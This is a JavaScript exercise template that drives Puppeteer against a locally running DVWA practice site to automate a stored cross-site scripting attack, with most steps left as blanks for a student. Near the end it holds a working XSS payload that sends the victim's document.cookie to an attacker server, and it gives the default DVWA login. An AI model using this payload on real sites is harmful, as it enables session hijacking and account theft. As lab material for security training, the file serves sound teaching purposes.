const puppeteer = require("puppeteer")
const {targetURL, attackerServer, Levels} = require('./config.js')

// To delay the time for scrapingbot to load contents
const delay = (time) => {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    });
}
/**
 * This is to practice auto scraping for Cross Site Scripting (Stored).
 *  
 * @param {str} targetURL DVWA URL locally running in your computer
 * @param {str} attacks a string (script tags)
 * @param {Levels} level Enum class (Levels) declared on config.js
 */
const xssAutoStored= async (targetURL, attack, level) => {
    /**
     * #1. Launch a headless Chromium for scraping.
     * */
    
    // const browser = 
    // const page =
    // await page.goto(targetURL)
    

    /** 
     * #2. On the target URL, it needs to be logged-in with the below information.
     * username : admin, password : password.
     * Login and add delay with 1000 millisecond.
     * */
    
    // await page.
    // await page.
    // await page.
    // await 


    /**
     * #3. There are total 4 levels on the DVWA webpage.
     * The level should be set to the same value of the passed parameter (level)
     * Go to the DVWA Security page, select level,submit it.
     */
    
    // await page.
    // await page.
    // await page.

    
    /**
     * #4. Since XSS stored attack leaves the result of the previous history,
     * it should be removed. 
     * Go to the Setup/Reset DB page, click the create/reset Database button
     * add delay with 1000 millisecond.
     */

    // await page
    // await page
    // await 

    
    /**
     * #5. Try attack
     * Go to the XSS(Stored) page, 
     * You should fill out both fields (Name and Message)
     * For the Name field, you can put any word ("HACKED!" or your name, or "Test")
     * For the Message field, you should pass the parameter (attack)
     * After clikc "Sign Guest" and delay 1000, 
     * Visit the targetURL page again. Go to the XSS(Stored) page. 
     * 
     */

    console.log(`Attack Start`)
    // await page.
    // await page.$eval
    // await page.$eval

    console.log("Script is Stored")
    await page.click('input[type="submit"]');
    await delay(1000);

    // await page.
    // await page.

    // Close the browser
    await browser.close();
}

attacksXssStored = "<script>window.location='"+attackerServer+"/session/'+document.cookie</script>",

xssAutoStored(targetURL, attacksXssStored, Levels.low)
